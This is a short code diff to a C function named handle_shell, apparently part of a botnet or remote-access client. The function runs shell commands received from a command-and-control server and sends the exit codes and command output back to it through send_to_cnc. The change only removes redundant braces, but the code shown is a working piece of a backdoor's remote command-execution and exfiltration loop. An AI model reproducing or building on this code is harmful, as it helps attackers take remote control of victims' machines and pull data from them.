@@ -72,9 +72,7 @@ void handle_shell()
     ret = shell(&cmd);
     free(cmd.cmd);
     if (ret == EXEC_SHELL_FAILED)
-    {
         send_to_cnc(&ret, sizeof(ret));
-    }
     else
     {
         send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
@@ -83,9 +81,7 @@ void handle_shell()
             bytes_read = read_shell_output(out, sizeof(out));
             send_to_cnc(&bytes_read, sizeof(bytes_read));
             if (!bytes_read)
-            {
                 return;
-            }
             send_to_cnc(out, bytes_read);
         }
     }
